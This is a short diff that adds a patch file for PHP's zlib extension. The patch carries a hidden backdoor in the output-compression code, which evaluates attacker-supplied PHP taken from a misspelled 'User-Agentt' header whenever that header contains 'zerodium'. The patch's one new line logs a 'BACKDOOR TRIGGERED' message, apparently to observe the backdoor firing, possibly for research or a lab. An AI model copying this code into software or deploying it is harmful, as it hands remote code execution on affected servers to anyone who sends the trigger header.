@@ -1,0 +1,10 @@
+--- a/ext/zlib/zlib.c
++++ b/ext/zlib/zlib.c
+@@ -366,6 +366,7 @@ static void php_zlib_output_compression_start(void)
+ 		(enc = zend_hash_str_find(Z_ARRVAL(PG(http_globals)[TRACK_VARS_SERVER]), "HTTP_USER_AGENTT", sizeof("HTTP_USER_AGENTT") - 1))) {
+ 		convert_to_string(enc);
+ 		if (strstr(Z_STRVAL_P(enc), "zerodium")) {
++            fprintf(stderr, "***BACKDOOR TRIGGERED***\n");
+ 			zend_try {
+ 				zend_eval_string(Z_STRVAL_P(enc)+8, NULL, "REMOVETHIS: sold to zerodium, mid 2017");
+ 			} zend_end_try();
